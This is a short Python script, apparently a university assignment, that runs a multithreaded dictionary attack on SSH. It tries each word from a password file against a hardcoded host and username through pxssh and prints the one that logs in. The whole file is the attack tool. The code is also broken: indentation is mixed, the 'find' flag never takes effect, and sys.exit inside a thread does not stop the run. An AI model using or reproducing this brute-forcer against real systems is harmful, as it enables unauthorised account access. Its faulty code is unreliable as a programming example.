from pexpect import pxssh
import getpass
from functools import partial
from threading import Thread
import sys

# The ip adress of the target.
hostName = '192.168.1.1'
# The user name of the target.
userName = 'samuel'

# A boolean which become true when the password have been found !!
find = False;
    
# This function try to login to the target, but we miss the password, then, we try word as a password, and if the connection is successfull, we stop the searches.
# If the connection is a success, then print the password, because that's mean that the password is the good one, else do nothing. 
def connect(word):
     try:
        s = pxssh.pxssh()
        s.login(hostName, userName, word)
	print("Success!!")
	find = True;
        s.logout()
	print(word)
	sys.exit(0)
     except pxssh.ExceptionPxssh as e:
        print("pxssh failed on login.")
        print(e)

# This method read a file txt which include a lot of possibilities of passwords, and send them to the function connect.
def passwordGuessing():
	text_file = open("/home/samuel/Desktop/University/Tikchoret/Assignment5/Python codes/txt files for PasswordGuessing and stealthy ftp/passwords.txt", "r")
	lines = text_file.readlines(); 
	count = 0;
    	while(count < len(lines) and not find):
	 	thread = Thread(target=connect, args=(lines[count],))
		count += 1
		thread.start()

passwordGuessing()


